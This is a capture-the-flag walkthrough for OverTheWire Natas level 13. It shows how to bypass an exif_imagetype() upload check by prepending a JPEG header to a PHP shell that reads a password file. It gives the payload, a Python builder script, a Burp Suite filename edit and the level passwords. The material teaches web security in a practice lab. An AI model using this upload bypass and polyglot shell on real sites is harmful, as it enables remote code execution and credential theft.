# Natas CTF Solutions  

## Natas Level 13  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Bypass **image type validation** to upload a PHP shell.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas13.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas13`  
- **Password:** Use the password from Natas Level 12:  
```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```  
![Home_Page](https://github.com/user-attachments/assets/90124546-a7e9-42d2-a965-82a35a5fcbc4)

---

### **Step 3: Analyze the Webpage**  
- The page allows **image uploads**.  
- Inspecting the source code reveals the use of `exif_imagetype()` to validate file types.  

![Page Source](https://github.com/user-attachments/assets/81e34224-62a7-4d7c-95c9-b8afea0c93bc)

---

### **Step 4: Create a Malicious PHP Shell Disguised as an Image**  
Since the server checks the file type using `exif_imagetype()` (which checks the file header), we can prepend a **JPEG header** to bypass this check.  

1. Create a PHP shell (`natas14.php`) with the following content:  
```php
<?php
  echo file_get_contents("/etc/natas_webpass/natas14");
?>
```  

2. Create a Python script (`payload.py`) to prepend a JPEG header and encode it in hex:  

```python
import codecs

# PHP Payload to execute
string = """<?php
  echo file_get_contents("/etc/natas_webpass/natas14");
?>"""

# Encode the PHP payload into hex
hex_string = codecs.encode(string.encode(), "hex").decode()

# Prepend JPEG header (FFD8FFDB) to make it look like an image
payload = "ffd8ffdb" + hex_string

# Write to file
with open("natas14.php", "wb") as f:
    f.write(codecs.decode(payload, "hex"))
```

3. Run the Python script:  
```bash
python3 payload.py
```

4. This generates a valid PHP file with a JPEG header.  

![Payload](https://github.com/user-attachments/assets/aa6d2caa-877e-40d6-aa02-4b268e36cf18)

---

### **Step 5: Upload the Payload**  
- Upload the `natas14.php` file.  
- Open **Burp Suite** and enable **intercept mode**.  
- Modify the `filename` extension from `.jpg` to `.php` in the request:  
```  
Content-Disposition: form-data; name="uploadedfile"; filename="natas14.php"  
```  
- Forward the request.  
![Modified_Content](https://github.com/user-attachments/assets/c4ea33ae-3d32-4090-9da6-e927b4b003a1)

---

### **Step 6: Execute the File**  
- After uploading, a link to the file will appear on the page.  
- Open the link to execute the PHP shell:  
```  
http://natas13.natas.labs.overthewire.org/uploads/natas14.php
```  
- The output will display the password for **Natas Level 14**.  

![File](https://github.com/user-attachments/assets/8ccdc51d-d0b1-4348-a80b-fc80b1f4766b)

---

### **✅ Password for Natas Level 14**  
```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```  

---

## 💡 **Lessons Learned**  
✔️ **File Type Validation Bypass**: Prepending a valid JPEG header can bypass file type validation.  
✔️ **exif_imagetype() Bypass**: `exif_imagetype()` only checks the file header, so adding a valid header tricks the server.  
✔️ **Command Execution via File Upload**: Uploading a malicious PHP shell allows for remote code execution.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code with Upload Logic | ![Page Source](https://github.com/user-attachments/assets/81e34224-62a7-4d7c-95c9-b8afea0c93bc) |  
| Step 5 – Burp Suite Interception | ![Modified_Content](https://github.com/user-attachments/assets/c4ea33ae-3d32-4090-9da6-e927b4b003a1) |  
| Step 6 – PHP Shell Execution | ![File](https://github.com/user-attachments/assets/8ccdc51d-d0b1-4348-a80b-fc80b1f4766b) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 14**:  
👉 [http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org)  

---
